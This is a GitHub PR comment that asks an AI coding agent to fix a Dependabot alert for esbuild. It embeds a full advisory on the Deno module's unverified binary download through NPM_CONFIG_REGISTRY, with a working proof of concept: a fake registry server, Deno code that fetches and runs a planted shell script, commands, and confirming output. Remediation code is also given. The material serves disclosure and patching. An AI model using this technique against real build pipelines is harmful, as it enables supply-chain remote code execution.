@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** esbuild (npm)
- **Severity:** HIGH
- **Vulnerable versions:** >= 0.17.0, < 0.28.1
- **Patched version:** 0.28.1
- **CVE:** N/A
- **GHSA:** GHSA-gv7w-rqvm-qjhr
- **Manifest:** seed/ts-sdk/simple-api/bundle/package.json

**Summary:**
esbuild: Missing binary integrity verification in Deno module enables remote code execution via NPM_CONFIG_REGISTRY

**Description:**
### Summary

The esbuild Deno module (`lib/deno/mod.ts`) downloads native binary executables from an npm registry and writes them to disk with executable permissions (`0o755`) **without performing any integrity verification** (e.g., SHA-256 hash check). The Node.js equivalent (`lib/npm/node-install.ts`) includes a robust `binaryIntegrityCheck()` function that verifies SHA-256 hashes against hardcoded expected values from `package.json`, but this protection was never implemented for the Deno distribution.

When the `NPM_CONFIG_REGISTRY` environment variable is set, the Deno module constructs a download URL using this attacker-influenced value and fetches a native binary from it. Because no integrity check is performed, an attacker who can control this environment variable (common in CI/CD pipelines, shared development environments, or corporate networks with custom npm registries) can supply a malicious binary that will be downloaded, written to disk, and executed with the privileges of the Deno process, achieving full remote code execution.

### Details

**Vulnerable code path** — `lib/deno/mod.ts` lines 62–82:

```typescript
async function installFromNPM(name: string, subpath: string): Promise<string> {
  const { finalPath, finalDir } = getCachePath(name)
  try { await Deno.stat(finalPath); return finalPath } catch (e) {}

  const npmRegistry = Deno.env.get("NPM_CONFIG_REGISTRY") || "https://registry.npmjs.org"  // line 70: attacker-controlled
  const url = `${npmRegistry}/${name}/-/${name.replace("`@esbuild`/", "")}-${version}.tgz`     // line 71: URL uses attacker base
  const buffer = await fetch(url).then(r => r.arrayBuffer())                                  // line 72: download
  const executable = extractFileFromTarGzip(new Uint8Array(buffer), subpath)                   // line 73: extract

  await Deno.mkdir(finalDir, { recursive: true, mode: 0o700 })
  await Deno.writeFile(finalPath, executable, { mode: 0o755 })                                 // line 80: write + chmod
  return finalPath                                                                              // line 81: no hash check
}
```

**Missing protection** — The Node.js equivalent at `lib/npm/node-install.ts` lines 228–234:

```typescript
function binaryIntegrityCheck(pkg: string, subpath: string, bytes: Uint8Array): void {
  const hash = crypto.createHash('sha256').update(bytes).digest('hex')
  const key = `${pkg}/${subpath}`
  const expected = packageJSON['esbuild.binaryHashes'][key]
  if (!expected) throw new Error(`Missing hash for "${key}"`)
  if (hash !== expected) throw new Error(...)
}
```

This function is called in both the `installUsingNPM()` path (line 131) and the `downloadDirectlyFromNPM()` path (line 243), but **no equivalent exists in the Deno module**. Searching the entire git history confirms `binaryIntegrityCheck`, `binaryHashes`, `sha256`, and `hash` have never appeared in `lib/deno/mod.ts`.

**Execution flow after download:** The binary returned by `installFromNPM()` is passed to `spawn()` at line 291 of the same file:
```typescript
const child = spawn(binPath, { args: [`--service=${version}`], ... })
```

**Attack vector:** The `NPM_CONFIG_REGISTRY` environment variable is a standard npm configuration variable widely used in enterprise CI/CD pipelines to point to internal artifact repositories (Artifactory, Nexus, Verdaccio, etc.). An attacker who can inject or modify this variable in a build environment (e.g., via CI config injection, shared environment, or compromised registry) can redirect the download to a server they control and serve a trojaned native binary.

### PoC

**Prerequisites:** Deno runtime, Node.js (for fake registry)

**Step 1:** Create a fake npm registry that serves a malicious binary:

```javascript
// fake-registry.js
const http = require('http');
const zlib = require('zlib');
http.createServer((req, res) => {
  const fakeBin = '#!/bin/sh\necho PWNED > /tmp/deno-esbuild-rce-proof.txt\necho fake-esbuild-0.28.0\n';
  // ... build tar.gz with fake binary as package/bin/esbuild ...
  res.writeHead(200, {'Content-Length': gz.length});
  res.end(gz);
}).listen(19876, () => console.log('READY'));
```

**Step 2:** Run the PoC with `NPM_CONFIG_REGISTRY` pointing to the fake server:

```typescript
// poc.ts — mimics lib/deno/mod.ts installFromNPM code path
const npmRegistry = Deno.env.get("NPM_CONFIG_REGISTRY") || "https://registry.npmjs.org";
const url = `${npmRegistry}/`@esbuild`/linux-x64/-/linux-x64-0.28.0.tgz`;
const buffer = new Uint8Array(await (await fetch(url)).arrayBuffer());
// ... gzip decompress + tar extraction (same as extractFileFromTarGzip) ...
await Deno.writeFile("/tmp/downloaded-binary", executable, { mode: 0o755 });
// *** NO integrity check performed ***
const cmd = new Deno.Command("/tmp/downloaded-binary");
await cmd.output(); // RCE: executes attacker-controlled binary
```

**Step 3:** Run:
```bash
node fake-registry.js &
NPM_CONFIG_REGISTRY="http://127.0.0.1:19876" deno run --allow-all poc.ts
cat /tmp/deno-esbuild-rce-proof.txt  # Output: PWNED
```

**Observed output in this environment:**
```
Download URL: http://127.0.0.1:19876/`@esbuild`/linux-x64/-/linux-x64-0.28.0.tgz
Binary written to: /tmp/deno-poc/downloaded-binary
Binary content: #!/bin/sh
echo PWNED > /tmp/deno-esbuild-rce-proof.txt
echo fake-esbuild-0.28.0

Executing downloaded binary...
stdout: fake-esbuild-0.28.0

*** RCE CONFIRMED ***
Marker file content: PWNED
```

**Build-local verification — using the actual built `deno/mod.js`:**

The esbuild Deno module was built from source (`node scripts/esbuild.js ./esbuild --deno`) producing `deno/mod.js`. The fake registry test was then re-run using the **actual module** via `import * as esbuild from "file:///path/to/deno/mod.js"`, triggering the real `installFromNPM()` → `installFromNPM()` code path:

```
[TEST] esbuild Deno module loaded
[TEST] esbuild version: 0.28.0

[TEST] *** RCE VIA ACTUAL MODULE CONFIRMED ***
[TEST] Marker file content: VULN-CONFIRMED
[TEST] The actual built deno/mod.js downloaded and executed
[TEST] a malicious binary from the fake registry WITHOUT
[TEST] performing any SHA-256 integrity verification.
```

The malicious binary was cached at `~/.cache/esbuild/bin/`@esbuild-linux-x64`@0.28.0` with contents:
```
#!/bin/sh
echo "VULN-CONFIRMED" > /tmp/esbuild-deno-verify-rce.txt
echo "0.28.0"
```

Built-in Deno module (`deno/mod.js`) confirmed to contain `NPM_CONFIG_REGISTRY` usage (line 1900) and zero references to `binaryIntegrityCheck`, `binaryHashes`, `sha256`, or `crypto.createHash`.

**Negative/control case — Node.js rejects the same fake binary:**
```
Fake binary SHA-256: d85234b9bac94fcda135d112f0c23d9c31bbb14a5502a37e743a3cf2a3750fa1
Expected hash:       aafacdf135322bf47c882a4ea4db33d0375583f5b9c3fd2d4e12258e470568be
Hashes match: false
=> Node.js path REJECTS the fake binary (hash mismatch)
=> Deno path ACCEPTS it without any check
```

### Impact

An attacker who can control the `NPM_CONFIG_REGISTRY` environment variable in a Deno project using esbuild can achieve **arbitrary code execution** with the privileges of the Deno process. This is particularly relevant in:

- **CI/CD pipelines** where `NPM_CONFIG_REGISTRY` is commonly set to point to internal artifact repositories
- **Shared development environments** where environment variables may be inherited from parent processes
- **Corporate networks** where npm registry mirrors are configured via this environment variable

The attacker does not need to compromise the npm registry itself — only the environment variable or network path between the Deno process and the registry.

### Suggested remediation

1. **Add SHA-256 integrity verification to the Deno module**, mirroring the existing `binaryIntegrityCheck()` function from `lib/npm/node-install.ts`:

```typescript
// In lib/deno/mod.ts, after extracting the binary:
const hashBuffer = await crypto.subtle.digest("SHA-256", executable);
const hash = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
const key = `${name}/${subpath}`;
const expected = EXPECTED_HASHES[key]; // Import from a shared hash manifest
if (hash !== expected) throw new Error(`Binary integrity check failed for "${key}"`);
```

2. **Validate the `NPM_CONFIG_REGISTRY` URL** to ensure it uses HTTPS (or at minimum warn about HTTP):

```typescript
const npmRegistry = Deno.env.get("NPM_CONFIG_REGISTRY") || "https://registry.npmjs.org";
if (npmRegistry.startsWith("http://")) {
  console.warn(`[esbuild] Warning: NPM_CONFIG_REGISTRY uses insecure HTTP`);
}
```

3. **Add `ESBUILD_BINARY_PATH` validation** in the Deno module, mirroring the `isValidBinaryPath()` check from `lib/npm/node-platform.ts`.

**Regression test suggestion:** Add a test that verifies the Deno download path rejects a binary with a mismatched SHA-256 hash.

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/2084)
